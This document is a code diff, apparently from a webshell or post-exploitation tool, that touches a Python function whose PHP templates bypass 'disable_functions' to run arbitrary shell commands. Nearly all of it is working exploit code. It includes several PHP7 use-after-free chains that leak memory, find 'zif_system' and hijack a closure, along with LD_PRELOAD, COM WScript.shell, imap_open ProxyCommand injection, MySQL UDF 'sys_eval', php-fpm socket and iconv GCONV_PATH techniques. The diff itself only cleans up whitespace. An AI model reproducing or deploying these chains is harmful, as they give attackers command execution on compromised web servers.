@@ -4,7 +4,7 @@ def get_php_system(bdf_mode):
         return """$o=pwn(base64_decode("%s"));
         function pwn($cmd) {
             global $abc, $helper, $backtrace;
-    
+
             class Vuln {
                 public $a;
                 public function __destruct() {
@@ -20,11 +20,11 @@ def get_php_system(bdf_mode):
                     }
                 }
             }
-    
+
             class Helper {
                 public $a, $b, $c, $d;
             }
-    
+
             function str2ptr(&$str, $p = 0, $s = 8) {
                 $address = 0;
                 for($j = $s-1; $j >= 0; $j--) {
@@ -33,7 +33,7 @@ def get_php_system(bdf_mode):
                 }
                 return $address;
             }
-    
+
             function ptr2str($ptr, $m = 8) {
                 $out = "";
                 for ($i=0; $i < $m; $i++) {
@@ -42,7 +42,7 @@ def get_php_system(bdf_mode):
                 }
                 return $out;
             }
-    
+
             function write(&$str, $p, $v, $n = 8) {
                 $i = 0;
                 for($i = 0; $i < $n; $i++) {
@@ -50,7 +50,7 @@ def get_php_system(bdf_mode):
                     $v >>= 8;
                 }
             }
-    
+
             function leak($addr, $p = 0, $s = 8) {
                 global $abc, $helper;
                 write($abc, 0x68, $addr + $p - 0x10);
@@ -58,21 +58,21 @@ def get_php_system(bdf_mode):
                 if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
                 return $leak;
             }
-    
+
             function parse_elf($base) {
                 $e_type = leak($base, 0x10, 2);
-    
+
                 $e_phoff = leak($base, 0x20);
                 $e_phentsize = leak($base, 0x36, 2);
                 $e_phnum = leak($base, 0x38, 2);
-    
+
                 for($i = 0; $i < $e_phnum; $i++) {
                     $header = $base + $e_phoff + $i * $e_phentsize;
                     $p_type  = leak($header, 0, 4);
                     $p_flags = leak($header, 4, 4);
                     $p_vaddr = leak($header, 0x10);
                     $p_memsz = leak($header, 0x28);
-    
+
                     if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                         # handle pie
                         $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
@@ -81,13 +81,13 @@ def get_php_system(bdf_mode):
                         $text_size = $p_memsz;
                     }
                 }
-    
+
                 if(!$data_addr || !$text_size || !$data_size)
                     return false;
-    
+
                 return [$data_addr, $text_size, $data_size];
             }
-    
+
             function get_basic_funcs($base, $elf) {
                 list($data_addr, $text_size, $data_size) = $elf;
                 for($i = 0; $i < $data_size / 8; $i++) {
@@ -98,7 +98,7 @@ def get_php_system(bdf_mode):
                         if($deref != 0x746e6174736e6f63)
                             continue;
                     } else continue;
-    
+
                     $leak = leak($data_addr, ($i + 4) * 8);
                     if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                         $deref = leak($leak);
@@ -106,11 +106,11 @@ def get_php_system(bdf_mode):
                         if($deref != 0x786568326e6962)
                             continue;
                     } else continue;
-    
+
                     return $data_addr + $i * 8;
                 }
             }
-    
+
             function get_binary_base($binary_leak) {
                 $base = 0;
                 $start = $binary_leak & 0xfffffffffffff000;
@@ -122,13 +122,13 @@ def get_php_system(bdf_mode):
                     }
                 }
             }
-    
+
             function get_system($basic_funcs) {
                 $addr = $basic_funcs;
                 do {
                     $f_entry = leak($addr);
                     $f_name = leak($f_entry, 0, 6);
-    
+
                     if($f_name == 0x6d6574737973) { # system
                         return leak($addr + 8);
                     }
@@ -136,71 +136,71 @@ def get_php_system(bdf_mode):
                 } while($f_entry != 0);
                 return false;
             }
-    
+
             function trigger_uaf($arg) {
                 # str_shuffle prevents opcache string interning
                 $arg = str_shuffle(str_repeat('A', 79));
                 $vuln = new Vuln();
                 $vuln->a = $arg;
             }
-    
+
             if(stristr(PHP_OS, 'WIN')) {
                 die('This PoC is for *nix systems only.');
             }
-    
+
             $n_alloc = 10; # increase this value if UAF fails
             $contiguous = [];
             for($i = 0; $i < $n_alloc; $i++)
                 $contiguous[] = str_shuffle(str_repeat('A', 79));
-    
+
             trigger_uaf('x');
             $abc = $backtrace[1]['args'][0];
-    
+
             $helper = new Helper;
             $helper->b = function ($x) { };
-    
+
             if(strlen($abc) == 79 || strlen($abc) == 0) {
                 die("UAF failed");
             }
-    
+
             # leaks
             $closure_handlers = str2ptr($abc, 0);
             $php_heap = str2ptr($abc, 0x58);
             $abc_addr = $php_heap - 0xc8;
-    
+
             # fake value
             write($abc, 0x60, 2);
             write($abc, 0x70, 6);
-    
+
             # fake reference
             write($abc, 0x10, $abc_addr + 0x60);
             write($abc, 0x18, 0xa);
-    
+
             $closure_obj = str2ptr($abc, 0x20);
-    
+
             $binary_leak = leak($closure_handlers, 8);
             if(!($base = get_binary_base($binary_leak))) {
                 die("bdf error: Couldn't determine binary base address");
             }
-    
+
             if(!($elf = parse_elf($base))) {
                 die("bdf error: Couldn't parse ELF header");
             }
-    
+
             if(!($basic_funcs = get_basic_funcs($base, $elf))) {
                 die("bdf error: Couldn't get basic_functions address");
             }
-    
+
             if(!($zif_system = get_system($basic_funcs))) {
                 die("bdf error: Couldn't get zif_system address");
             }
-    
+
             # fake closure object
             $fake_obj_offset = 0xd0;
             for($i = 0; $i < 0x110; $i += 8) {
                 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
             }
-    
+
             write($abc, 0x20, $abc_addr + $fake_obj_offset);
             write($abc, 0xd0 + 0x38, 1, 4); # internal func type
             write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
@@ -214,10 +214,10 @@ def get_php_system(bdf_mode):
     if bdf_mode == 2:  # php7-gc
         return """
         $o=pwn(base64_decode("%s"));
-        
+
         function pwn($cmd) {
             global $abc, $helper;
-        
+
             function str2ptr(&$str, $p = 0, $s = 8) {
                 $address = 0;
                 for($j = $s-1; $j >= 0; $j--) {
@@ -226,7 +226,7 @@ def get_php_system(bdf_mode):
                 }
                 return $address;
             }
-        
+
             function ptr2str($ptr, $m = 8) {
                 $out = "";
                 for ($i=0; $i < $m; $i++) {
@@ -235,7 +235,7 @@ def get_php_system(bdf_mode):
                 }
                 return $out;
             }
-        
+
             function write(&$str, $p, $v, $n = 8) {
                 $i = 0;
                 for($i = 0; $i < $n; $i++) {
@@ -243,7 +243,7 @@ def get_php_system(bdf_mode):
                     $v >>= 8;
                 }
             }
-        
+
             function leak($addr, $p = 0, $s = 8) {
                 global $abc, $helper;
                 write($abc, 0x68, $addr + $p - 0x10);
@@ -251,21 +251,21 @@ def get_php_system(bdf_mode):
                 if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
                 return $leak;
             }
-        
+
             function parse_elf($base) {
                 $e_type = leak($base, 0x10, 2);
-        
+
                 $e_phoff = leak($base, 0x20);
                 $e_phentsize = leak($base, 0x36, 2);
                 $e_phnum = leak($base, 0x38, 2);
-        
+
                 for($i = 0; $i < $e_phnum; $i++) {
                     $header = $base + $e_phoff + $i * $e_phentsize;
                     $p_type  = leak($header, 0, 4);
                     $p_flags = leak($header, 4, 4);
                     $p_vaddr = leak($header, 0x10);
                     $p_memsz = leak($header, 0x28);
-        
+
                     if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                         # handle pie
                         $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
@@ -274,13 +274,13 @@ def get_php_system(bdf_mode):
                         $text_size = $p_memsz;
                     }
                 }
-        
+
                 if(!$data_addr || !$text_size || !$data_size)
                     return false;
-        
+
                 return [$data_addr, $text_size, $data_size];
             }
-        
+
             function get_basic_funcs($base, $elf) {
                 list($data_addr, $text_size, $data_size) = $elf;
                 for($i = 0; $i < $data_size / 8; $i++) {
@@ -291,7 +291,7 @@ def get_php_system(bdf_mode):
                         if($deref != 0x746e6174736e6f63)
                             continue;
                     } else continue;
-        
+
                     $leak = leak($data_addr, ($i + 4) * 8);
                     if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                         $deref = leak($leak);
@@ -299,11 +299,11 @@ def get_php_system(bdf_mode):
                         if($deref != 0x786568326e6962)
                             continue;
                     } else continue;
-        
+
                     return $data_addr + $i * 8;
                 }
             }
-        
+
             function get_binary_base($binary_leak) {
                 $base = 0;
                 $start = $binary_leak & 0xfffffffffffff000;
@@ -315,13 +315,13 @@ def get_php_system(bdf_mode):
                     }
                 }
             }
-        
+
             function get_system($basic_funcs) {
                 $addr = $basic_funcs;
                 do {
                     $f_entry = leak($addr);
                     $f_name = leak($f_entry, 0, 6);
-        
+
                     if($f_name == 0x6d6574737973) { # system
                         return leak($addr + 8);
                     }
@@ -329,7 +329,7 @@ def get_php_system(bdf_mode):
                 } while($f_entry != 0);
                 return false;
             }
-        
+
             class ryat {
                 var $ryat;
                 var $chtg;
@@ -339,75 +339,75 @@ def get_php_system(bdf_mode):
                     $this->ryat = 1;
                 }
             }
-        
+
             class Helper {
                 public $a, $b, $c, $d;
             }
-        
+
             if(stristr(PHP_OS, 'WIN')) {
                 die('This PoC is for *nix systems only.');
             }
-        
+
             $n_alloc = 10; # increase this value if you get segfaults
-        
+
             $contiguous = [];
             for($i = 0; $i < $n_alloc; $i++)
                 $contiguous[] = str_repeat('A', 79);
-        
+
             $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
             $out = unserialize($poc);
             gc_collect_cycles();
-        
+
             $v = [];
             $v[0] = ptr2str(0, 79);
             unset($v);
             $abc = $out[2][0];
-        
+
             $helper = new Helper;
             $helper->b = function ($x) { };
-        
+
             if(strlen($abc) == 79 || strlen($abc) == 0) {
                 die("UAF failed");
             }
-        
+
             # leaks
             $closure_handlers = str2ptr($abc, 0);
             $php_heap = str2ptr($abc, 0x58);
             $abc_addr = $php_heap - 0xc8;
-        
+
             # fake value
             write($abc, 0x60, 2);
             write($abc, 0x70, 6);
-        
+
             # fake reference
             write($abc, 0x10, $abc_addr + 0x60);
             write($abc, 0x18, 0xa);
-        
+
             $closure_obj = str2ptr($abc, 0x20);
-        
+
             $binary_leak = leak($closure_handlers, 8);
             if(!($base = get_binary_base($binary_leak))) {
                 die("Couldn't determine binary base address");
             }
-        
+
             if(!($elf = parse_elf($base))) {
                 die("Couldn't parse ELF header");
             }
-        
+
             if(!($basic_funcs = get_basic_funcs($base, $elf))) {
                 die("Couldn't get basic_functions address");
             }
-        
+
             if(!($zif_system = get_system($basic_funcs))) {
                 die("Couldn't get zif_system address");
             }
-        
+
             # fake closure object
             $fake_obj_offset = 0xd0;
             for($i = 0; $i < 0x110; $i += 8) {
                 write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
             }
-        
+
             # pwn
             write($abc, 0x20, $abc_addr + $fake_obj_offset);
             write($abc, 0xd0 + 0x38, 1, 4); # internal func type
@@ -419,15 +419,15 @@ def get_php_system(bdf_mode):
             %s
             return $o;
         }"""
-    if bdf_mode == 3: # php7-json
+    if bdf_mode == 3:  # php7-json
         return """
             $cmd = base64_decode("%s");
             $n_alloc = 10; # increase this value if you get segfaults
-    
+
             class MySplFixedArray extends SplFixedArray {
                 public static $leak;
             }
-    
+
             class Z implements JsonSerializable {
                 public function write(&$str, $p, $v, $n = 8) {
                   $i = 0;
@@ -436,7 +436,7 @@ def get_php_system(bdf_mode):
                     $v >>= 8;
                   }
                 }
-    
+
                 public function str2ptr(&$str, $p = 0, $s = 8) {
                     $address = 0;
                     for($j = $s-1; $j >= 0; $j--) {
@@ -445,7 +445,7 @@ def get_php_system(bdf_mode):
                     }
                     return $address;
                 }
-    
+
                 public function ptr2str($ptr, $m = 8) {
                     $out = "";
                     for ($i=0; $i < $m; $i++) {
@@ -454,45 +454,45 @@ def get_php_system(bdf_mode):
                     }
                     return $out;
                 }
-    
+
                 # unable to leak ro segments
                 public function leak1($addr) {
                     global $spl1;
-    
+
                     $this->write($this->abc, 8, $addr - 0x10);
                     return strlen(get_class($spl1));
                 }
-    
+
                 # the real deal
                 public function leak2($addr, $p = 0, $s = 8) {
                     global $spl1, $fake_tbl_off;
-    
+
                     # fake reference zval
                     # gc_refcounted
                     $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef);
                     $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
                     $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)
-    
+
                     $leak = strlen($spl1::$leak);
                     if($s != 8) { $leak %%= 2 << ($s * 8) - 1; }
-    
+
                     return $leak;
                 }
-    
+
                 public function parse_elf($base) {
                     $e_type = $this->leak2($base, 0x10, 2);
-    
+
                     $e_phoff = $this->leak2($base, 0x20);
                     $e_phentsize = $this->leak2($base, 0x36, 2);
                     $e_phnum = $this->leak2($base, 0x38, 2);
-    
+
                     for($i = 0; $i < $e_phnum; $i++) {
                         $header = $base + $e_phoff + $i * $e_phentsize;
                         $p_type  = $this->leak2($header, 0, 4);
                         $p_flags = $this->leak2($header, 4, 4);
                         $p_vaddr = $this->leak2($header, 0x10);
                         $p_memsz = $this->leak2($header, 0x28);
-    
+
                         if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                             # handle pie
                             $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
@@ -501,13 +501,13 @@ def get_php_system(bdf_mode):
                             $text_size = $p_memsz;
                         }
                     }
-    
+
                     if(!$data_addr || !$text_size || !$data_size)
                         return false;
-    
+
                     return [$data_addr, $text_size, $data_size];
                 }
-    
+
                 public function get_basic_funcs($base, $elf) {
                     list($data_addr, $text_size, $data_size) = $elf;
                     for($i = 0; $i < $data_size / 8; $i++) {
@@ -518,7 +518,7 @@ def get_php_system(bdf_mode):
                             if($deref != 0x746e6174736e6f63)
                                 continue;
                         } else continue;
-    
+
                         $leak = $this->leak2($data_addr, ($i + 4) * 8);
                         if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                             $deref = $this->leak2($leak);
@@ -526,11 +526,11 @@ def get_php_system(bdf_mode):
                             if($deref != 0x786568326e6962)
                                 continue;
                         } else continue;
-    
+
                         return $data_addr + $i * 8;
                     }
                 }
-    
+
                 public function get_binary_base($binary_leak) {
                     $base = 0;
                     $start = $binary_leak & 0xfffffffffffff000;
@@ -542,13 +542,13 @@ def get_php_system(bdf_mode):
                         }
                     }
                 }
-    
+
                 public function get_system($basic_funcs) {
                     $addr = $basic_funcs;
                     do {
                         $f_entry = $this->leak2($addr);
                         $f_name = $this->leak2($f_entry, 0, 6);
-    
+
                         if($f_name == 0x6d6574737973) { # system
                             return $this->leak2($addr + 8);
                         }
@@ -556,112 +556,112 @@ def get_php_system(bdf_mode):
                     } while($f_entry != 0);
                     return false;
                 }
-    
+
                 public function jsonSerialize() {
                     global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;
-    
+
                     $contiguous = [];
                     for($i = 0; $i < $n_alloc; $i++)
                         $contiguous[] = new DateInterval('PT1S');
-    
+
                     $room = [];
                     for($i = 0; $i < $n_alloc; $i++)
                         $room[] = new Z();
-    
+
                     $_protector = $this->ptr2str(0, 78);
-    
+
                     $this->abc = $this->ptr2str(0, 79);
                     $p = new DateInterval('PT1S');
-    
+
                     unset($y[0]);
                     unset($p);
-    
+
                     $protector = ".$_protector";
-    
+
                     $x = new DateInterval('PT1S');
                     $x->d = 0x2000;
                     $x->h = 0xdeadbeef;
                     # $this->abc is now of size 0x2000
-    
+
                     if($this->str2ptr($this->abc) != 0xdeadbeef) {
                         die('UAF failed.');
                     }
-    
+
                     $spl1 = new MySplFixedArray();
                     $spl2 = new MySplFixedArray();
-    
+
                     # some leaks
                     $class_entry = $this->str2ptr($this->abc, 0x120);
                     $handlers = $this->str2ptr($this->abc, 0x128);
                     $php_heap = $this->str2ptr($this->abc, 0x1a8);
                     $abc_addr = $php_heap - 0x218;
-    
+
                     # create a fake class_entry
                     $fake_obj = $abc_addr;
                     $this->write($this->abc, 0, 2); # type
                     $this->write($this->abc, 0x120, $abc_addr); # fake class_entry
-    
+
                     # copy some of class_entry definition
                     for($i = 0; $i < 16; $i++) {
                         $this->write($this->abc, 0x10 + $i * 8,
                             $this->leak1($class_entry + 0x10 + $i * 8));
                     }
-    
+
                     # fake static members table
                     $fake_tbl_off = 0x70 * 4 - 16;
                     $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);
                     $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);
-    
+
                     # fake zval_reference
                     # zval
                     $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10);
                     # zval type (reference)
                     $this->write($this->abc, $fake_tbl_off + 8, 10);
-    
+
                     # look for binary base
                     $binary_leak = $this->leak2($handlers + 0x10);
                     if(!($base = $this->get_binary_base($binary_leak))) {
                         die("Couldn't determine binary base address");
                     }
-    
+
                     # parse elf header
                     if(!($elf = $this->parse_elf($base))) {
                         die("Couldn't parse ELF");
                     }
-    
+
                     # get basic_functions address
                     if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {
                         die("Couldn't get basic_functions address");
                     }
-    
+
                     # find system entry
                     if(!($zif_system = $this->get_system($basic_funcs))) {
                         die("Couldn't get zif_system address");
                     }
-    
+
                     # copy hashtable offsetGet bucket
                     $fake_bkt_off = 0x70 * 5 - 16;
-    
+
                     $function_data = $this->str2ptr($this->abc, 0x50);
                     for($i = 0; $i < 4; $i++) {
                         $this->write($this->abc, $fake_bkt_off + $i * 8,
                             $this->leak2($function_data + 0x40 * 4, $i * 8));
                     }
-    
+
                     # create a fake bucket
                     $fake_bkt_addr = $abc_addr + $fake_bkt_off;
                     $this->write($this->abc, 0x50, $fake_bkt_addr);
                     for($i = 0; $i < 3; $i++) {
                         $this->write($this->abc, 0x58 + $i * 4, 1, 4);
                     }
-    
+
                     # copy bucket zval
                     $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);
                     for($i = 0; $i < 12; $i++) {
                         $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8,
                             $this->leak2($function_zval, $i * 8));
                     }
-    
+
                     # pwn
                     $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
                     $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);
@@ -673,11 +673,11 @@ def get_php_system(bdf_mode):
                     $GLOBAL['o']=$o;
                 }
             }
-    
+
             $y = [new Z()];
             json_encode([&$y]);
             $o=$GLOBAL['o'];"""
-    if bdf_mode == 4: # LD_PRELOAD
+    if bdf_mode == 4:  # LD_PRELOAD
         return """
             $p="/tmp/%s";
             putenv("cmd=".base64_decode("%s"));
@@ -698,14 +698,14 @@ def get_php_system(bdf_mode):
             $f->pclose($o);
             $o=hex2bin($d);
             %s"""
-    if bdf_mode == 6: # COM
+    if bdf_mode == 6:  # COM
         return """
             $wsh = new COM('WScript.shell');
             $exec = $wsh->exec("cmd /c ".base64_decode("%s"));
             $stdout = $exec->StdOut();
             $o = $stdout->ReadAll();
             %s"""
-    if bdf_mode == 7: # imap_open
+    if bdf_mode == 7:  # imap_open
         return """
             if (!function_exists('imap_open')) {print("no imap_open function!");}
             else{$server = "x -oProxyCommand=echo\\t" . base64_encode(base64_decode("%s") . ">/tmp/%s") . "|base64\\t-d|sh}";
@@ -714,8 +714,8 @@ def get_php_system(bdf_mode):
             $o=file_get_contents("/tmp/%s");
             %s
             unlink("/tmp/%s");}"""
-    if bdf_mode == 8: # MYSQL-UDF
-        return {"pdo":""""
+    if bdf_mode == 8:  # MYSQL-UDF
+        return {"pdo": """"
             try{%s
                 $r=$con->query("select sys_eval(unhex('%s'))");
                 $rr=$r->fetch();
@@ -723,7 +723,7 @@ def get_php_system(bdf_mode):
                 $GLOBAL['o']=$o;
                 %s
                 } catch (PDOException $e){
-            }""","mysql":""""%s
+            }""", "mysql": """"%s
             if ($con)
             {
                 $r=$con->query(select sys_eval(unhex('%s')));
@@ -734,14 +734,14 @@ def get_php_system(bdf_mode):
                 $r->close();
                 $con->close();
             }"""}
-    if bdf_mode == 9: # php7-SplDoublyLinkedList
+    if bdf_mode == 9:  # php7-SplDoublyLinkedList
         return """
             error_reporting(E_ALL);
-            
+
             define('NB_DANGLING', 200);
             define('SIZE_ELEM_STR', 40 - 24 - 1);
             define('STR_MARKER', 0xcf5ea1);
-    
+
             function i2s(&$s, $p, $i, $x=8)
             {
                 for($j=0;$j<$x;$j++)
@@ -750,22 +750,22 @@ def get_php_system(bdf_mode):
                     $i >>= 8;
                 }
             }
-    
-    
+
+
             function s2i(&$s, $p, $x=8)
             {
                 $i = 0;
-    
+
                 for($j=$x-1;$j>=0;$j--)
                 {
                     $i <<= 8;
                     $i |= ord($s[$p+$j]);
                 }
-    
+
                 return $i;
             }
-    
-    
+
+
             class UAFTrigger
             {
                 function __construct($cmd)
@@ -775,15 +775,15 @@ def get_php_system(bdf_mode):
                 function __destruct()
                 {
                     global $dlls, $strs, $rw_dll, $fake_dll_element, $leaked_str_offsets;
-    
+
                     $dlls[NB_DANGLING]->offsetUnset(0);
-    
+
                     # At this point every $dll->current points to the same freed chunk. We allocate
                     # that chunk with a string, and fill the zval part
                     $fake_dll_element = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
                     i2s($fake_dll_element, 0x00, 0x12345678); # ptr
                     i2s($fake_dll_element, 0x08, 0x00000004, 7); # type + other stuff
-    
+
                     # Each of these dlls current->next pointers point to the same location,
                     # the string we allocated. When calling next(), our fake element becomes
                     # the current value, and as such its rc is incremented. Since rc is at
@@ -791,13 +791,13 @@ def get_php_system(bdf_mode):
                     # allowing to R/W any part of the following memory
                     for($i = 0; $i <= NB_DANGLING; $i++)
                         $dlls[$i]->next();
-    
+
                     if(strlen($fake_dll_element) <= SIZE_ELEM_STR)
                         die('Exploit failed: fake_dll_element did not increase in size');
-    
+
                     $leaked_str_offsets = [];
                     $leaked_str_zval = [];
-    
+
                     # In the memory after our fake element, that we can now read and write,
                     # there are lots of zend_string chunks that we allocated. We keep three,
                     # and we keep track of their offsets.
@@ -812,22 +812,22 @@ def get_php_system(bdf_mode):
                                 break;
                         }
                     }
-    
+
                     if(count($leaked_str_zval) != 3)
                         die('Exploit failed: unable to leak three zend_strings');
-    
+
                     # free the strings, except the three we need
                     $strs = null;
-    
+
                     # Leak adress of first chunk
                     unset($leaked_str_zval[0]);
                     unset($leaked_str_zval[1]);
                     unset($leaked_str_zval[2]);
                     $first_chunk_addr = s2i($fake_dll_element, $leaked_str_offsets[1]);
-    
+
                     # At this point we have 3 freed chunks of size 40, which we can read/write,
                     # and we know their address.
-    
+
                     # In the third one, we will allocate a DLL element which points to a zend_array
                     $rw_dll->push([3]);
                     $array_addr = s2i($fake_dll_element, $leaked_str_offsets[2] + 0x18);
@@ -835,38 +835,38 @@ def get_php_system(bdf_mode):
                     i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
                     if(gettype($rw_dll[0]) != 'string')
                         die('Exploit failed: Unable to change zend_array to zend_string');
-    
+
                     # We can now read anything: if we want to read 0x11223300, we make zend_string*
                     # point to 0x11223300-0x10, and read its size using strlen()
-    
+
                     # Read zend_array->pDestructor
                     $zval_ptr_dtor_addr = read($array_addr + 0x30);
-    
-    
+
+
                     # Use it to find zif_system
                     $system_addr = get_system_address($zval_ptr_dtor_addr);
-    
+
                     # In the second freed block, we create a closure and copy the zend_closure struct
                     # to a string
                     $rw_dll->push(function ($x) {});
                     $closure_addr = s2i($fake_dll_element, $leaked_str_offsets[1] + 0x18);
                     $data = str_shuffle(str_repeat('A', 0x200));
-    
+
                     for($i = 0; $i < 0x138; $i += 8)
                     {
                         i2s($data, $i, read($closure_addr + $i));
                     }
-    
+
                     # Change internal func type and pointer to make the closure execute system instead
                     i2s($data, 0x38, 1, 4);
                     i2s($data, 0x68, $system_addr);
-    
+
                     # Push our string, which contains a fake zend_closure, in the last freed chunk that
                     # we control, and make the second zval point to it.
                     $rw_dll->push($data);
                     $fake_zend_closure = s2i($fake_dll_element, $leaked_str_offsets[0] + 0x18) + 24;
                     i2s($fake_dll_element, $leaked_str_offsets[1] + 0x18, $fake_zend_closure);
-    
+
                     # Calling it now
                     ob_start();
                     $rw_dll[1]($this->cmd);
@@ -875,14 +875,14 @@ def get_php_system(bdf_mode):
                     %s
                 }
             }
-    
+
             class DanglingTrigger
             {
                 function __construct($i)
                 {
                     $this->i = $i;
                 }
-    
+
                 function __destruct()
                 {
                     global $dlls;
@@ -891,7 +891,7 @@ def get_php_system(bdf_mode):
                     $dlls[$this->i+1]->offsetUnset(0);
                 }
             }
-    
+
             class SystemExecutor extends ArrayObject
             {
                 function offsetGet($x)
@@ -899,7 +899,7 @@ def get_php_system(bdf_mode):
                     parent::offsetGet($x);
                 }
             }
-    
+
             /**
              * Reads an arbitrary address by changing a zval to point to the address minus 0x10,
              * and setting its type to zend_string, so that zend_string->len points to the value
@@ -908,18 +908,18 @@ def get_php_system(bdf_mode):
             function read($addr, $s=8)
             {
                 global $fake_dll_element, $leaked_str_offsets, $rw_dll;
-    
+
                 i2s($fake_dll_element, $leaked_str_offsets[2] + 0x18, $addr - 0x10);
                 i2s($fake_dll_element, $leaked_str_offsets[2] + 0x20, 0x00000006);
-    
+
                 $value = strlen($rw_dll[0]);
-    
+
                 if($s != 8)
                     $value &= (1 << ($s << 3)) - 1;
-    
+
                 return $value;
             }
-    
+
             function get_binary_base($binary_leak)
             {
                 $base = 0;
@@ -935,22 +935,22 @@ def get_php_system(bdf_mode):
                 # We'll crash before this but it's clearer this way
                 die('Exploit failed: Unable to find ELF header');
             }
-    
+
             function parse_elf($base)
             {
                 $e_type = read($base + 0x10, 2);
-    
+
                 $e_phoff = read($base + 0x20);
                 $e_phentsize = read($base + 0x36, 2);
                 $e_phnum = read($base + 0x38, 2);
-    
+
                 for($i = 0; $i < $e_phnum; $i++) {
                     $header = $base + $e_phoff + $i * $e_phentsize;
                     $p_type  = read($header + 0x00, 4);
                     $p_flags = read($header + 0x04, 4);
                     $p_vaddr = read($header + 0x10);
                     $p_memsz = read($header + 0x28);
-    
+
                     if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                         # handle pie
                         $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
@@ -959,13 +959,13 @@ def get_php_system(bdf_mode):
                         $text_size = $p_memsz;
                     }
                 }
-    
+
                 if(!$data_addr || !$text_size || !$data_size)
                     die('Exploit failed: Unable to parse ELF');
-    
+
                 return [$data_addr, $text_size, $data_size];
             }
-    
+
             function get_basic_funcs($base, $elf) {
                 list($data_addr, $text_size, $data_size) = $elf;
                 for($i = 0; $i < $data_size / 8; $i++) {
@@ -976,7 +976,7 @@ def get_php_system(bdf_mode):
                         if($deref != 0x746e6174736e6f63)
                             continue;
                     } else continue;
-    
+
                     $leak = read($data_addr + ($i + 4) * 8);
                     if($leak - $base > 0 && $leak < $data_addr) {
                         $deref = read($leak);
@@ -984,18 +984,18 @@ def get_php_system(bdf_mode):
                         if($deref != 0x786568326e6962)
                             continue;
                     } else continue;
-    
+
                     return $data_addr + $i * 8;
                 }
             }
-    
+
             function get_system($basic_funcs)
             {
                 $addr = $basic_funcs;
                 do {
                     $f_entry = read($addr);
                     $f_name = read($f_entry, 6);
-    
+
                     if($f_name == 0x6d6574737973) { # system
                         return read($addr + 8);
                     }
@@ -1003,7 +1003,7 @@ def get_php_system(bdf_mode):
                 } while($f_entry != 0);
                 return false;
             }
-    
+
             function get_system_address($binary_leak)
             {
                 $base = get_binary_base($binary_leak);
@@ -1012,14 +1012,14 @@ def get_php_system(bdf_mode):
                 $zif_system = get_system($basic_funcs);
                 return $zif_system;
             }
-    
+
             define('NB_STRS', 50);
-    
+
             $dlls = [];
             $strs = [];
             $rw_dll = new SplDoublyLinkedList();
-    
-    
+
+
             # Create a chain of dangling triggers, which will all in turn
             # free current->next, push an element to the next list, and free current
             # This will make sure that every current->next points the same memory block,
@@ -1030,31 +1030,31 @@ def get_php_system(bdf_mode):
                 $dlls[$i]->push(new DanglingTrigger($i));
                 $dlls[$i]->rewind();
             }
-    
+
             # We want our UAF'd list element to be before two strings, so that we can
             # obtain the address of the first string, and increase is size. We then have
             # R/W over all memory after the obtained address.
-    
+
             for($i = 0; $i < NB_STRS; $i++)
             {
                 $strs[] = str_shuffle(str_repeat('A', SIZE_ELEM_STR));
                 i2s($strs[$i], 0, STR_MARKER);
                 i2s($strs[$i], 8, $i, 7);
             }
-    
+
             # Free one string in the middle, ...
             $strs[NB_STRS - 20] = 123;
             # ... and put the to-be-UAF'd list element instead.
             $dlls[0]->push(0);
-    
+
             # Setup the last DLlist, which will exploit the UAF
             $dlls[NB_DANGLING] = new SplDoublyLinkedList();
             $dlls[NB_DANGLING]->push(new UAFTrigger(base64_decode("%s")));
             $dlls[NB_DANGLING]->rewind();
-    
+
             # Trigger the bug on the first list
             $dlls[0]->offsetUnset(0);"""
-    if bdf_mode == 10: # php-fpm
+    if bdf_mode == 10:  # php-fpm
         return {
             "gopher": """function curl($url){
                 $ch = curl_init();
@@ -1065,12 +1065,12 @@ def get_php_system(bdf_mode):
                 }
                 ob_start();curl("%s");$o=ob_get_clean();%s
                 """,
-            "sock":"""if(function_exists('stream_socket_client') && file_exists($sock_path)){
+            "sock": """if(function_exists('stream_socket_client') && file_exists($sock_path)){
                     $sock=stream_socket_client("unix://".$sock_path);
                     } else {
                     die('stream_socket_client function not exist or sock not exist');
                     }""",
-            "http_sock":"""
+            "http_sock": """
                 if(function_exists('fsockopen')){
                     $sock=fsockopen($host, $port, $errno, $errstr, 1);
                 } else if(function_exists('pfsockopen')){
@@ -1125,7 +1125,7 @@ def get_php_system(bdf_mode):
                 chmod($f, 0777);
                 print($f);
             """
-    if bdf_mode == 12: # iconv
+    if bdf_mode == 12:  # iconv
         return """$p="%s";
             putenv("GCONV_PATH=/tmp/");
             putenv("cmd=".base64_decode("%s"));
@@ -1148,12 +1148,12 @@ def get_php_system(bdf_mode):
               new SplFileObject('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
